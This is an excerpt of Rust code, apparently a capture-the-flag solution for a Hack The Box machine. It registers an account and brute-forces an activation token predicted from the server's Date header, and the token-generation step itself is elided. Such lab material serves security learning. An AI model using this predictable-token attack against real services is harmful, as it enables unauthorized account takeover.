...
/// Function to create a user and return the `Date` header if the user is created.
async fn create_user(client: &Client<hyper::client::HttpConnector>) -> Result<Option<String>, Box<dyn Error>> {
    let req = Request::builder()
        .method("POST")
        .uri("http://monitor.isotope.htb/api/register")
        .header(USER_AGENT, "the-super-cool-agent/1337")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"username":"ISA112","password":"1234"}"#))?;

    // Send the request and get the response
    let resp = client.request(req).await?;

    // Extract status and clone headers
...
async fn activate_user(client: &Client<hyper::client::HttpConnector>, token: &str) -> Result<(), Box<dyn Error>> {
    let json_body = json!({ "activation_token": token }).to_string();

    let req = Request::builder()
        .method("POST")
        .uri("http://monitor.isotope.htb/activate")
        .header(USER_AGENT, "the-super-cool-agent/1337")
        .header(CONTENT_TYPE, "application/json")
    ...
    println!("Activation response: {}", body_str);
    Ok(())
}
...
async fn main() -> Result<(), Box<dyn Error>> {
    ...
    // Create user and get the date header
    let date = match create_user(&client).await {
    ...
    for offset in -2..=2 {
        ...
        let timestamp_str = DateTime::<Utc>::from_utc(
            NaiveDateTime::from_timestamp_opt(current_timestamp, 0).unwrap(),
            Utc,
        );
        println!("Generating activation tokens");
        ...
        match activate_user(&client, &token).await {
            Ok(_) => {
                println!("Activation attempt successful with token: {}", token);
                break;
            }
            Err(e) => eprintln!("Error activating user: {}", e),
        }
    }
